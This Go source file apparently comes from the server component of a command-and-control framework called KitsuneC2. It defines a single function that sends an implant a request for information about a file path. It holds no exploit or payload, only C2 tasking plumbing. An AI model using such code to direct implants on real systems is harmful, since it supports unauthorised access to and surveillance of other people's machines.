// this file contains all requests that the server can send to an implant. Note that these functions don't close their passed connections, as
// these are not "handlers",

package main

import (
	"KitsuneC2/lib/communication"
)

func RequestFileInfo(sess *session, pathToFile string) error {
	req := communication.FileInfoReq{PathToFile: pathToFile}
	err := SendEnvelopeToImplant(sess, 11, req)
	if err != nil {
		return err
	}
	return nil
}
